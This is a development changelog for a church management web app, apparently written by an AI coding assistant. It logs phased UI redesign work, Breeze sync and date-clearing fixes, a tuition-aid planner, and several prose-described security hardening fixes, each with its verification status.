- **Context**: continuing the phased app redesign. Per the user's direction, Giving is being tracked as its own separate effort (in another session); this pass covers the remaining pure card/token alignment work — Households, Person Profile, and Reports — none of which needed structural changes, matching the "already close to the mockup" scoping in `CLAUDE.md`.
- **Households** (`.h-card` in `html-head.js`): converted from a bordered 12px-radius card to the Phase 1 borderless soft dual-shadow card (18px radius). `.card-grid` gap bumped 14px→16px to match the mockup's card-grid spacing exactly (shared by Households and Organizations, which both use this class).
- **Person Profile** (`.pv-section` — the Contact/Demographics/Family/Tags/Notes cards in the Information tab): same borderless soft-shadow treatment, 10px→18px radius. Left the nested `.pv-field-card` demographics tiles and the `.pv-aside` sidebar column as-is — those are nested/chrome elements, not top-level cards, and giving them their own floating shadow would look visually noisy stacked inside an already-shadowed parent (same reasoning applied to Giving's nested `.rpt-stat` below and to leaving Giving's batch-list/detail panels unstyled individually in the prior phase).
- **Reports** (`.report-tile`, `.report-output`, `.rpt-stat` in `html-head.js`): report-type tiles get a lighter single-layer shadow (matching the mockup's smaller report tiles, which use a subtler shadow than the bigger cards); the report-output preview panel (shown after "Run Report") gets the full two-layer soft-shadow treatment at 20px radius, matching `.dash-card`/`.giving-layout`. The nested `.rpt-stat` overview chips lost their 1px border but keep their existing `--linen` fill (radius 8px→12px) since they sit inside an already-white panel and need their own visual differentiation, not a floating-card look.
- **Explicitly not done this pass**: the ~18 individually inline-styled sub-blocks inside specific report renderers (Giving Insights, People Insights, etc. in `js-reports.js`) were not swept — those are per-report custom layouts, not the shared tile/output shell, and match the same "SVG chart-fill colors... needs visual verification" class of work already flagged as open in PAL5. Household View (the single-household detail page) and Person Profile's aside sidebar were also left untouched — neither was shown in the mockup, and both are more "sidebar chrome" than "floating card."
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render of the Households grid, a Person Profile page, the Reports tile grid, and a rendered report-output panel (Membership Summary) — all confirmed borderless/soft-shadow/correctly-radiused with no visual regressions to existing content (nested field tiles, tables, filter controls all still read correctly).

### 2026-07-14 (v1.15.0 — Redesign Phase 3 (RDS2): People tab master-detail quick-view panel)
- **Context**: continuing the phased app redesign. Per the confirmed decision, the People tab gains a right-side quick-view panel — clicking a person shows a preview (avatar, contact info, household member chips, Call/Full Profile actions) without leaving the list; "Full Profile" still navigates to the existing Person Profile page. Existing filters, pagination, sort, List/Card toggle, multi-select, and bulk actions are all **unchanged** — this was scoped as an additive interaction layer on top of the existing list, not a rebuild.
- **Markup** (`html-tabs.js`): wrapped the existing `#p-grid`/`#p-card-grid`/`#p-pager` in a new `.ppl-list-col` alongside a new `#ppl-quickview` panel, inside a `.ppl-master-detail` flex row. Empty state ("Select a person to view details") matches the existing Giving-tab batch-detail empty-state pattern for consistency.
- **JS** (`js-people.js`): row/card click handlers in `renderPeopleDesktop`/`renderPeopleCards` now call new `openPersonQuickView(id)` instead of jumping straight to `openPersonDetail(id)` when not in Select mode (Select mode's checkbox-toggle click behavior is untouched). `openPersonQuickView` fetches the existing single-person endpoint, `renderPersonQuickView` builds the panel (reusing `avatarTint`/`initials`/`typeDotHtml`/`esc` — no new helpers), and `loadQuickViewHousehold` fetches the existing `GET /admin/api/households/:id` for the chip row, guarding against stale responses if the user clicks a different person before it resolves. Clicking a household chip re-targets the quick-view to that person (and the underlying list's highlighted row follows, verified in Playwright). Entering Select mode clears the quick-view back to its empty state, since browsing one person's preview doesn't make sense mid-bulk-select.
- **No backend changes** — the People list endpoint already returned `household_id`/`household_display_name` per person, and the household member list already existed via the Households API; no new endpoints were needed.
- **Visual**: the newly-viewed/highlighted row gets a teal inset accent (`.dir-row-qv`/`.ppl-card.qv-active`), kept visually distinct from the navy bulk-select highlight (`.dir-row-selected`/`.ppl-card.selected`) since the two states use different colors and are mutually exclusive in practice.
- **Mobile unchanged**: the panel is hidden below 767px (existing breakpoint) — the mobile contact-card list (`renderPeopleMobile`) already has its own Call/Email/Map buttons per card and still navigates straight to the full profile, untouched.
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks; Playwright render covering: empty state, clicking a row (panel populates + row highlights), clicking a household chip (panel re-targets + list highlight follows), switching to Card view mid-selection (highlight persists), entering Select mode (panel resets, click behavior reverts to checkbox toggle), and the Full Profile button (confirmed it still opens `#profile-view`).

### 2026-07-14 (v1.14.0 — Redesign Phase 2 (RDS4): Giving Batches/Transactions toggle + stat tiles)
- **Context**: continuing the phased app redesign (see RDS1 below). Per the user's decision, Giving keeps its existing batch-centric workflow as one view and gains a toggle to a flatter transaction view with fund + date-range filters, plus the mockup's stat-tile row — not a replacement of batches.
- **New backend endpoints** (`src/api-giving.js`, both GET, inherit the existing `isFinance`-only gate already enforced in `api-chms.js` for all `giving*` routes): `GET /admin/api/giving/stats` returns This Week / This Month / Year-to-Date totals (all funds, unlike the Dashboard's General-Fund-only `gfYtd`) plus a distinct-givers-YTD count, using calendar week (Monday, via the existing `isoWeekKey()` helper)/month/year boundaries computed in JS and bound as parameters (no raw SQL date interpolation). `GET /admin/api/giving/transactions?fund_id=&from=&to=&limit=` returns a flat, filterable list of entries across all batches (donor/fund/method/date/amount), reusing the same `COALESCE(NULLIF(contribution_date,''), batch_date)` effective-date pattern already used by the per-person giving history endpoint. Verified both queries against a real local D1 instance (`wrangler d1 migrations apply --local` + hand-seeded rows) before wiring the frontend.
- **Frontend** (`src/frontend/js-giving.js`, `html-tabs.js`, `html-head.js`): new "Batches / Transactions" pill toggle (reuses the existing `.view-toggle` class from the People tab) in the Giving tab header; a `.dash-stats`/`dash-stat` row (reusing Phase 1's card classes rather than a parallel stat-tile system) showing the four stats; a new Transactions panel with Fund/From/To filter fields (reusing the existing `.field` class from the batch entry form) and a flat table (reuses `.entries-table`). Clicking a transaction row calls the existing shared `goToBatch()` (also used from Person Profile giving history) which now explicitly switches back to the Batches view before opening the batch, so the opened entry is actually visible instead of landing behind the hidden Batches panel. The existing batch list/detail split-panel (`.giving-layout`) got a wrap in the Phase-1 soft-shadow card look (radius + box-shadow) so it doesn't sit as a flat-edged rectangle directly under the new rounded stat cards — its internal structure/behavior is otherwise unchanged.
- **Verified**: `npm test` (37/37); `node --check` on all 3 built `<script>` blocks and on `api-giving.js`; Playwright render of both Batches and Transactions views with mocked API responses — stat tiles, toggle, filters, and table all render correctly with no console errors.
- **Not done this pass**: no Settings UI or new business concept was introduced for "giving units" — the stat tile uses the app's existing "distinct givers" definition (`COUNT(DISTINCT person_id)`, same as the Reports tab's "Total Givers"), not a new household-level giving-unit concept, since the mockup's own README says its numbers are placeholder content, not a spec.

### 2026-07-14 (v1.13.0 — Redesign Phase 1: token foundation + Dashboard reskin)
- **Context**: a design-handoff package (`ChMS Redesign.dc.html` + `README.md`) was delivered proposing a unified visual language (navy/teal/gold, borderless soft-shadow cards, pill controls) across Dashboard, People, Households, Person Profile, Giving, Reports, Scheduler, and Volunteers. Confirmed with the user this is a **phased** rollout, starting with a token-consolidation foundation + Dashboard as the pilot screen, verified visually before continuing. Three structural questions were resolved up front (not guessed): sidebar stays hamburger-everywhere (no persistent desktop rail — retheme colors only); People tab will get a master-detail quick-view panel in a later phase; Giving tab will get a Batches/Transactions view toggle with fund + date-range filters in a later phase (kept batches, did not touch Giving this pass).
- **Token alignment** (`src/frontend/html-head.js` `:root`): the mockup's finalized palette (navy `#1E2D4A`, teal `#2E7EA6`, gold `#C9973A`) already matched existing `--color-*` tokens exactly — no change needed there. Three tokens were off by a shade and updated to the mockup's exact finalized values: `--warm-white`/`--bg` (page background) `#F8F4EE`→`#FAF9F6`, `--warm-gray` (muted/secondary text) `#7A6E60`→`#8A8377`, `--linen` (divider/light-surface) `#F2EDE2`→`#F1EFE9`. These are global tokens used throughout the app, so the effect is app-wide but subtle (a hair warmer/lighter) — not scoped to Dashboard alone.
- **Avatar tint consolidation**: `AVATAR_TINTS` in `src/frontend/js-core.js` (shared by People/Households/Dashboard) updated from its old 5-tint set to the mockup's exact 6-tint rotation (gold, teal, clay, sage, periwinkle, mauve). Separately found and fixed a real duplicate-palette bug this surfaced: Dashboard's own `renderDashboard()` had a second, one-off avatar color array (`pvColors`, 5 flat saturated hex values, no relation to the shared system) used by First-Time Givers/Not Seen Recently/Birthdays/Anniversaries rows. Replaced all 5 usages with the shared `avatarTint(id)` helper so Dashboard avatars now match the same palette as everywhere else in the app.
- **Dashboard card reskin** (`.dash-stat`/`.dash-card`/`.dash-card-hdr` in `html-head.js`): converted from bordered 12px-radius flat cards to the mockup's borderless soft dual-shadow cards (`box-shadow:0 1px 3px rgba(20,20,40,.05),0 10px 24px rgba(20,20,40,.05)`, 20px radius), matching grid gaps (20px) and stat-tile padding (22px 24px) from the mockup exactly. Stat labels un-uppercased to match the mockup's title-case style (all existing label strings were already properly cased, e.g. "Members"/"Last Sunday" — purely a CSS `text-transform` removal, no JS/copy changes). No markup, data-binding, or behavior changes — this was achievable as a pure CSS + one JS-array edit since Dashboard already rendered through reusable `dash-*` classes rather than inline styles.
- **Verified**: `npm test` (37/37) passes; all 3 built `CHMS_HTML` `<script>` blocks parse clean (`node --check`, per the SC3-BUG1 pattern); live-rendered via a static Playwright pass (built HTML + mocked `/admin/api/*` responses via route interception, since this environment has no D1/auth backend) — confirmed the Dashboard, sidebar drawer, and topbar all render correctly with the new tokens and no visual regressions.
- **Not done this pass (queued as follow-up phases, see CLAUDE.md)**: People (add quick-view panel), Households, Person Profile, Giving (Batches/Transactions toggle + fund/date filters), Reports, Scheduler/Volunteers alignment. Reusable component classes beyond what Dashboard already had (e.g. a formal quick-view-panel or master-detail shell class) were not yet built — deferred to the People phase where they're first needed, to avoid building abstractions before a second real consumer exists.

### 2026-07-14 (v1.12.0 — Tuition Aid Planner tab added)
- **New feature**: "Tuition Aid" tab (finance/admin only, sidebar under Giving), built from an uploaded mockup (`Timothy_Tuition_Aid_Dashboard.html`) but wired to real D1 data instead of session-only hardcoded arrays.
- New tables: `tuition_students` (K-8/LHS roster + pipeline entrants, money in integer cents, optional `person_id`/`household_id` link to real People records), `tuition_config` (key/value budget knobs: K-8 budget, tuition base rate, growth %, LHS standard rate, Timothy's $2,000/student floor, 50% family-share cap), `tuition_history` (historical tuition-rate/family-share chart data). Migration `migrations/0014_tuition_aid_planner.sql`; one-time seed (`seedTuitionAid()` in `src/db.js`) loads the 2026-27 budgeted-awards roster from `Tuition_Awards_2026.xlsx` so the tab isn't empty on first load — seeded rows are unlinked (`person_id` NULL) and staff link each to a real person via the planner's search picker at their own pace.
- New `src/api-tuition-aid.js` (`handleTuitionAidApi`): CRUD for roster rows (create/patch/soft-delete), a `/bulk` endpoint so Apply-Policy/Auto-Balance/Reset save in one round trip instead of N, config PATCH, history PUT. Gated `isFinance` (admin+finance) in `api-chms.js`, matching the Giving tab's access level.
- New `src/frontend/js-tuition-aid.js` (`JS_TUITION_AID`): ports the mockup's full algorithm (grade progression by base-grade or pipeline birth-year, family-share-percentage slider model so tuition increases split proportionally instead of landing entirely on the family, $2,000/student floor, 50%-cap Apply Policy with budget-remainder redistribution, Auto-Balance budget-fit scaling) — but recomputed from live roster+config on every render instead of a static year-0 snapshot. KPI row, Pathway stage tracker + transition flags, 4 charts (History, Composition via the existing shared `renderPieChart`, Budget Projection, Enrollment Mix — hand-rolled SVG, no Chart.js dependency, matching the app's existing chart pattern), K-8 detail table, and the two interactive planner tables (K-8 family-share sliders, LHS per-student award sliders) with debounced auto-save per edit.
- Verified: seed row math reconciles exactly against the workbook (`timothyAward` sums to $67,000, `familyOwed` to $54,300, every row's outsideAid+timothy+family=tuition). All 3 built `<script>` blocks syntax-check clean (`node --check`) per the SC3-BUG1 debugging pattern. `npm test` passes (37/37). Local D1 smoke-tested: migration applies cleanly, seed-shaped INSERTs and the config `ON CONFLICT...DO UPDATE` upsert both verified against a real SQLite engine via `wrangler d1 execute --local`.
- Not done this session (flagged for a follow-up pass): no Playwright/browser visual verification of the sliders/gauges in a live render — this was a backend+wiring-verified build, not a pixel-checked one. `PL1b` (pledge tracking) remains a separate, unrelated backlog item.

### 2026-07-14 (v1.11.1 — Google Address Validation added as first-choice provider)
- **Context**: USPS's legacy free Web Tools XML address-validation API shut down January 25, 2026; its replacement (USPS OAuth API) is free but rate-limited to 60 requests/hour, too low for bulk validation at scale.
- Added `validateGoogle()` to `src/api-utils.js`, calling the Google Address Validation API (`addressvalidation.googleapis.com/v1:validateAddress`). New optional secret `GOOGLE_ADDRESS_API_KEY`.
- `validateAddressCore()` priority order updated: **Google → USPS OAuth → USPS Web Tools (legacy) → Lob → Census** (was USPS OAuth → USPS Web Tools → Lob → Census). Existing USPS/Lob secrets are unchanged and still used as fallbacks if Google's key is absent or the church prefers not to enable it.
- `SECRETS.md` updated with `GOOGLE_ADDRESS_API_KEY` provisioning steps (Google Cloud Console → enable billing → enable Address Validation API → restrict key) and clarified the USPS OAuth rate-limit caveat.
- No schema/DB changes. `npm test` passes (37/37); all `<script>` blocks syntax-check clean.

### 2026-07-13 (v1.11.0 — Reverse sync of date/sacramental fields to Breeze)
- **Extends the app→Breeze reverse sync (BR1) to cover date fields**, closing the loop from the v1.10.0 deletion fix: previously reverse sync only pushed **name/email/phone/address**, so clearing an anniversary (or DOB/baptism/confirmation) in the app left Breeze untouched and a later per-person "Sync Breeze" re-imported the old value. Now setting **or clearing** any of `dob` / `baptism_date` / `confirmation_date` / `anniversary_date` on a person who already has a `breeze_id` pushes that change to Breeze on save.
- New `getBreezeDateFieldIds(db, breeze)` discovers the writable Breeze profile-field ids for those four fields using the same name-matching lists as the inbound sync (`breeze.profile()` → flatten → match, preferring names containing "date" so the boolean "Baptized"/"Confirmed" companion fields are never written). Cached in `chms_config` under `breeze_date_field_ids`.
- New `buildBreezeDateFields()` emits **only the fields that actually changed**. An empty value is sent as an empty `response` — a **clear**, which is format-agnostic and is the important path for propagating a deletion. A non-empty date is sent as `YYYY-MM-DD`. Year-unknown sentinels (`0001-MM-DD`) are skipped (can't be represented in Breeze). A field whose Breeze id couldn't be discovered is skipped (never guessed).
- Wired into both `PUT` and `PATCH /admin/api/people/:id`; fire-and-forget (`.catch(()=>{})`) so a Breeze failure never blocks the local save. Each date-field push writes a `reverse_sync_breeze` `audit_log` row (`field` = changed keys, `new_value` = `pushed`/`failed`) so it can be verified in production.
- **⚠ Needs a live-Breeze verification pass:** this session can't reach the Breeze API (no key/network), and the codebase had never written a **date** profile field to Breeze before (only contact fields). The clear path (empty response) is format-safe; the **set** path assumes Breeze accepts `YYYY-MM-DD` for date custom fields and that the built-in birthdate field accepts its discovered `field_type`. To verify: edit a test person's anniversary in the app, confirm it changes in Breeze; clear it, confirm it clears; check the `reverse_sync_breeze` audit rows say `pushed`. If Breeze rejects the format, adjust `buildBreezeDateFields()` (likely `MM/DD/YYYY` or a different `field_type` for birthdate). (`src/api-people.js`)
- Not changed: the inbound per-person/bulk sync still treats an empty Breeze value as "leave existing" (`CASE WHEN ? != '' …`), so pushing a clear won't cause the next inbound sync to fight it.

### 2026-07-13 (v1.10.0 — Anniversary (and other date) deletion fix)
- **Reported bug**: "For editing anniversary I can't delete the info from a person even if they have no partner." Traced end-to-end: the frontend already sends `anniversary_date: null` when cleared and the `PUT`/`PATCH` handlers already store `''` (verified against a real SQLite instance and by evaluating the actual served frontend payload) — so the *edit itself* was never the problem. Two real gaps made deletion feel impossible:
  1. **No delete affordance on date fields.** The only way to remove a date was to manually empty a native `<input type="date">`, which has no obvious clear control — so staff trying to remove an erroneous anniversary (e.g. on a single person with no partner) had no discoverable way to do it. Added an explicit **Clear** link to every date field in both edit surfaces: `pedDateField()` (profile inline Demographics editor) and the person-edit modal's Date of Birth / Baptism / Confirmation / Anniversary / Death Date fields. New shared `clearDateField(inputId, cbId)` helper empties the input and unticks the paired "Year unknown" checkbox; saving an empty field stores `''`. (`src/frontend/js-people.js`, `src/frontend/html-tabs.js`, `src/frontend/html-head.js` — new `.pm-date-clear` style.)
  2. **Anniversary re-propagation could resurrect a deliberate clear.** The bulk Breeze-sync household anniversary-propagation pass (`api-import.js`) copied an anniversary onto any head/spouse with an empty date — with no `locally_edited` guard and no deceased-partner exclusion — so a full sync could silently refill a just-cleared anniversary from a partner (including a *deceased* partner). Added `AND locally_edited=0` and `AND (p2.deceased=0 OR p2.deceased IS NULL)` to that pass. Applied the same guards to the immediate PUT-time propagation in `api-people.js` so setting one spouse's anniversary can't overwrite a partner who deliberately cleared theirs.
- **Not changed (by design):** the per-person "Sync Breeze" button still pulls Breeze's value verbatim (that button *is* "refresh this person from Breeze") — if an anniversary lives in Breeze, re-syncing that person re-imports it. To remove it permanently, clear it in Breeze too, or just don't re-sync that person.
- Verified: all served `CHMS_HTML` `<script>` blocks parse (`node --check` on each extracted block); the generated `pedDateField` markup is well-formed with correct `\'`→`'` escaping inside the `String.raw` module; `api-import.js`/`api-people.js` syntax-check clean.

### 2026-07-12 (v1.9.7 — PAL5 first pass: zero-risk inline hex → token substitutions)
- **Started PAL5 (eliminate hardcoded inline colors) scoped strictly to substitutions with zero visual risk**: only converted a raw hex literal to a `var(--token)` reference where (a) the hex exactly equals an already-defined token's value (so the computed color is bit-identical, not a judgment call), and (b) the literal sits in a context CSS custom properties are unambiguously supported in — real `<style>` block rules, `style="..."` HTML attributes, and JS `.style.property = 'var(...)'` / string-built style-attribute assignments. Deliberately left untouched: SVG `fill=`/`stroke=` presentation attributes (var() support there is inconsistent enough across engines that changing them would need a visual check), `<input type="color" value="#hex">` (must stay a literal string), and any hex with no exact existing token match (would require a naming/merging decision, not just a substitution).
- `src/frontend/html-head.js`: 4 raw hex → token in real CSS rules (`.dir-avatar-0/1`, `.vol-subnav`, `.toggle-switch`), plus all 48 literal `#fff` occurrences in `style="..."` attributes → `var(--white)`.
- `src/frontend/html-tabs.js`: all 22 literal `#fff` → `var(--white)`; 3 Volunteers/Events `color:#1E2D4A` → `var(--ev-navy)`, 8 `color:#8A8898` → `var(--ev-muted)` (matching the section's existing `--ev-*` naming convention). Left the two `<input type="color" value="#...">` swatches as literal hex (required).
- `src/frontend/js-core.js`: `TYPE_COLORS` (the member-type dot/label color map) turned out to be an exact, unnoticed duplicate of the `--status-*` tokens already in `html-head.js` `:root` — all 6 entries now reference `var(--status-member)` etc. instead of repeating the same 6 hex values a second time. Also converted 2 of 5 `AVATAR_TINTS` entries with exact token matches, both `filterChip()` call sites, the JS-error banner, and 2 more scattered `#fff`/`'#2E7EA6'`/`'#C9973A'` literals to token references.
- `src/public/head.js`: deleted the dead `.annotation-bar`/`.annotation-pill`/`.page-divider` CSS (mockup-annotation styling carried over from a design reference file — confirmed via grep those classes are never applied to any real markup on the live site). Also audited the rest of the public site's raw hex usage and found nothing else to safely convert: every core-brand-color usage outside `:root` already uses `var(--navy)`/`var(--teal)`/etc. — the public site was already fully tokenized for its own palette.
- Explicitly **not** attempted in this pass: the chart-drawing files (`js-reports.js`, `js-attendance.js`, `js-dashboard.js` — the bulk of the 171-count, almost entirely SVG `fill=`/`stroke=` attributes) and any hex with no exact token match anywhere (e.g. `#e74c3c`/`#c0392b` vs. `--danger` `#B85C3A` — visually different reds, not interchangeable without a design decision). Those remain queued as PAL5 follow-up batches that do need visual verification.
- Verified all served `CHMS_HTML` script blocks and `PUBLIC_HTML` still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-12 (v1.9.6 — PAL1/PAL4: canonical token doc, reconcile a genuine duplicate, align scheduler tokens)
- **PAL1 — Defined the canonical extended Palette A token reference** as a comment block above the admin app's `:root` in `src/frontend/html-head.js`: documents which existing legacy/`--ev-*` tokens are shades/tints of the 4 core brand colors (navy `#1E2D4A`, teal `#2E7EA6`, gold `#C9973A`, cream `#F8F4EE`), and calls out `--sage` (#6B8F71) vs `--ev-moss` (#4A5E3A) as two *legitimately distinct* status greens (lighter "success/positive" vs. darker "Acceptance ministry identity / open-slots") rather than duplicates to merge — an important distinction for the PAL2/PAL3 usage sweeps still to come, so they don't get flattened into one color and lose meaning.
- **Reconciled one genuine duplicate found during the audit**: `--ev-danger` was a separate red (`#c0392b`) from the `--danger` (`#B85C3A`) used everywhere else in the app (including the scheduler's own `--danger-btn`, which already matched `--danger`). `--ev-danger` now aliases `var(--danger)` — a real fix, not just documentation, with a small visible effect (Volunteers/Events "hidden" badges and delete links now use the same warm red as every other danger affordance in the app instead of a colder crimson). (`src/frontend/html-head.js`)
- **PAL4 — Aligned the scheduler's own `:root` token *values*** in `src/scheduler-html.js` to match the admin app's Palette-A-derived legacy tokens (e.g. `--steel-anchor` #0A3C5C → #1E2D4A, `--amber` #D4922A → #C9973A, `--charcoal` #3D3530 → #1A1A2A, fonts Lora/Source Sans 3 → DM Sans/Source Sans 3 to match admin's `--font-head`/`--font-body`). Confirmed this is zero-risk to the live embedded Scheduler tab — `scheduler-inline.js`'s `_scopeCss()` strips the entire `:root` block on embed, so ChMS's own (already-Palette-A) tokens were already the ones actually rendering; this change only removes the confusing "two different token sets that happen to look the same once embedded" indirection and fixes what the now-retired standalone route's source would show. `scheduler/index.html` resynced. (`src/scheduler-html.js`, `scheduler/index.html`)
- Verified all served `CHMS_HTML` and `SCHEDULER_HTML` script blocks still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-12 (v1.9.5 — pre-redesign decisions #3/#4: retire /scheduler, close SW17)
- **Retired the standalone `/scheduler` route** (user decision #3: "use only the embedded tab, the /scheduler [route] is not used"). Investigated first: confirmed `/scheduler/lcms_calendar.json` is a genuine live data dependency of the *embedded* Scheduler tab (`scheduler-inline.js` fetches it at runtime) — kept that sub-route working. Confirmed the only other reference to `/scheduler/` anywhere in the codebase was inside `ADMIN_HTML`, itself dead/unserved code. `tlc-volunteer-worker.js`'s `/scheduler` handler now 302-redirects any direct hit to `https://chms.timothystl.org/#scheduler` (the embedded tab) instead of serving the standalone page; removed the now-unused `SCHEDULER_HTML` import from the worker (the embedded build imports it directly via `scheduler-inline.js`, unaffected). This also resolves **RD3** from the Phase 20 redesign-readiness notes — the standalone route's divergent "Steel & Amber" visual identity is no longer a live user-facing concern. (`tlc-volunteer-worker.js`)
- **SW17 — Deduplicated the Giving Trend chart.** The Attendance tab's chart-resize-drag handler had ~35 lines of hand-inlined SVG-drawing logic that was a second copy of `renderGivingTrendChart()` (`js-reports.js`) and had already drifted (hardcoded `2026` Christmas-marker year vs. the Reports-tab copy's correct year derivation). Replaced the inline copy with a call to the shared renderer, re-targeting just the `<svg>` portion so in-place resize-drag redraw still works without replacing the wrapper element mid-drag. While consolidating to the single shared renderer, also fixed the underlying hardcoded-year bug in `renderGivingTrendChart()` itself (`xAtDate(2026, 12, 25)` → derives the year from the last entry in `d.years`) — since both call sites now share this one function, leaving the hardcode in place would have meant the "fix" just made the bug universal instead of removing it. Verified via extracted-source Node execution with mock data (correct SVG extraction, correct dynamic year) plus `node --check` and the full test suite. (`src/frontend/js-attendance.js`, `src/frontend/js-reports.js`)
- Explicitly deferred merging the 3 person-renderer implementations in `js-people.js` (part of user decision #4) — unlike the chart (one buggy copy of one correct thing), these are legitimately different layouts with no single canonical form; consolidating them properly belongs in the actual visual redesign, not this pre-redesign correctness pass.
- Verified all served `CHMS_HTML` script blocks still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.9.4 — Phase 20: SW16)
- **SW16 — Deleted 15 dead functions with zero call sites** (independently re-verified each one before deleting, not just trusting the earlier finding): `clearAllFunds`, `generateRegisterFromPeople`, `importAttendanceTSV`, `importPeopleCSV`, `lookupPaymentId`, `restoreBreezeActive`, `syncBreezeAttendanceCounts` (`js-export-import.js`); `openMemberTypesManager` (`js-settings.js`); `breezeGetHtml`, `exportIcal`, `getOrdinal`, `initBreezeTab`, `restoreRsvpTokens`, `roleAbbrev` (plus its now-unused `ROLE_ABBREVS` constant), `updateLoginStatus` (`src/scheduler-html.js`). The handful of references that turned up for 3 of these were only from `chms-admin.html`, a stale repo-root snapshot file not wired into the Worker at all (last touched before the IN3 frontend module split) — not real callers. `scheduler/index.html` resynced to match.
- Verified all served `CHMS_HTML` and `SCHEDULER_HTML` script blocks still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.9.3 — Phase 20: SW12)
- **SW12 — N+1 query pattern fixed in the main Breeze person-import loop.** Each of the up to 100 people per import page previously triggered its own `SELECT id FROM households WHERE breeze_id=?` and `SELECT id FROM people WHERE breeze_id=?` — up to ~200 sequential D1 round trips per page. Both are now bulk pre-loaded into in-memory maps before the loop (chunked at 90 per the D1 param-limit convention), matching the pre-load pattern PF3/PF4 already established elsewhere in this file. Scoped deliberately narrow: household **creation** and the person INSERT/UPDATE stay per-row exactly as before (they're causally ordered — a new household's id must exist before the person row references it — and carry the detailed `locally_edited`-preservation CASE/WHEN logic, so batching those write statements is a separate, higher-risk change left for later). One real subtlety handled: since the household lookup map is now loaded once before the loop instead of freshly re-queried per row, a second family member appearing later in the *same* page needed an explicit self-heal (write newly-created households back into the map immediately) to avoid creating a duplicate household — verified against a real local D1 instance with two same-family people in one page, confirming both correctly resolve to the one household. (`src/api-import.js`)
- Verified all served `CHMS_HTML` script blocks still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.9.2 — Phase 20 batch: SW9, SW13)
- **SW9 — Fixed UTC/Central time mismatch in birthday/anniversary dedup.** `audit_log.ts` is stored in UTC (`datetime('now')` default), but the dedup checks compared it against `date('now')` — also UTC, but the *eligibility* queries for who's due today already use Central time. Result: the 9am-Central daily cron is self-consistent, but an admin manually re-triggering a send in the evening (roughly 6-7pm Central onward, once UTC has already rolled to "tomorrow") could get a duplicate send, since the dedup check no longer recognizes the same-Central-day audit row from earlier that day. New `alreadySentTodayCentral()` helper widens the SQL window (cheap, uses the existing `ts` index) and does the exact Central-calendar-day comparison in JS via `Intl.DateTimeFormat` (handles DST automatically, consistent with the existing `centralTodayMMDD()` helper). Verified against the exact reported scenario (9am Central send, 7pm Central re-trigger) — the old comparison missed the duplicate, the new one catches it. (`src/api-emails.js`)
- **SW13 — Fixed silent partial-failure in Breeze giving-sync deletion detection.** Of the 5 parallel Breeze audit-log fetches in `import/breeze-giving`, only `contribution_added` aborted the sync on failure — `contribution_deleted` and `bulk_contributions_deleted` (which together determine what NOT to re-import) silently fell back to an empty array on error, meaning a previously-deleted Breeze contribution could quietly reappear with no indication anything went wrong. Those two now abort the sync with a clear error, matching `contribution_added`'s existing behavior. The other two (`bulk_import_contributions`, `contribution_updated`) are correctness-enhancing rather than deletion-gating, so they stay best-effort — but a failure there is now recorded in `diagnostics.warnings` and called out in the sync status message ("N warning(s), see diagnostics") instead of being completely silent. (`src/api-import.js`, `src/frontend/js-export-import.js`)
- Verified all served `CHMS_HTML` script blocks still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.9.1 — Phase 20 batch: SW10, SW11, SW14, SW15)
- **SW10 — RSVP tokens now use a real CSPRNG.** Both token-generation sites in the scheduler (email invite send + weekly reminder send) built tokens from `Math.random()`, which is not cryptographically strong, to gate an unauthenticated public RSVP action. New shared `genRsvpToken()` uses `crypto.getRandomValues()` for a 160-bit token. `scheduler/index.html` resynced to match. (`src/scheduler-html.js`, `scheduler/index.html`)
- **SW11 — Fixed HTML-attribute injection in Settings' member-type mapping dropdown.** The status-value escaping only handled single quotes (for the inline `onchange="..."` JS-string context) but not double quotes (the outer HTML attribute delimiter) — a Breeze status value containing `"` could break out of the attribute. Switched to the same `data-*` + delegated-listener pattern used elsewhere in the app (registered once at module load, not per-render, so it doesn't accumulate duplicate listeners). Verified the exploit is neutralized. (`src/frontend/js-settings.js`)
- **SW14 — `POST giving/batches/:id/entries` now validates amount/fund**, matching its `PUT`/quick-entry siblings which already rejected a $0 amount or missing fund. The frontend already blocked this client-side; this closes the same gap server-side. (`src/api-giving.js`)
- **SW15 — Excel-formula-injection guard on the giving-diagnose CSV export.** A cell value starting with `=`, `+`, `-`, or `@` (e.g. from a person/fund/batch name) is now prefixed with a leading `'` so spreadsheet apps read it as text instead of executing it as a formula. (`src/frontend/js-reports.js`)
- Verified all served `CHMS_HTML`/`SCHEDULER_HTML` script blocks still parse; `npx vitest run` (37 tests) still passes.

### 2026-07-11 (v1.9.0 — ground-up code sweep: SW1–SW8)
A full ground-up (not diff-based) code review was run across the entire codebase ahead of a planned cross-app UI/UX redesign — 8 parallel review passes covering every backend and frontend file, not just recent changes. Findings were catalogued with SW-codes; the 7 critical/high items plus SW8 (deceased/anniversary data quality) were fixed this session and verified against real local D1 instances or standalone logic tests, not just read-through. Remaining medium/low findings and redesign-readiness notes are tracked separately (see CLAUDE.md Phase 20).

- **SW1 — Scheduler data/config endpoints had no role check.** `GET/POST /admin/api/scheduler/data` and `PUT /admin/api/scheduler/config` only required "logged in," not a role — any `member`-level account could read `ws_breeze_settings` (which stores the scheduler's own raw Breeze API key, Resend key, and worker secret in D1, separate from the env-var secrets) or overwrite the entire schedule. Added an `admin`/`staff` guard at the top of `handleSchedulerDataApi`. (`src/api-admin.js`)
- **SW2 — Same missing-role-check gap on signups/push-broadcast/volunteer-templates.** `DELETE/PUT /admin/api/signups/*`, `POST /admin/api/push-broadcast`, and the mutating methods of `volunteer-templates`/signup link-person/send-email all only checked "logged in." Added `admin`/`staff` guards (GET on volunteer-templates stays open to any authenticated role, matching read-access elsewhere). (`src/api-admin.js`)
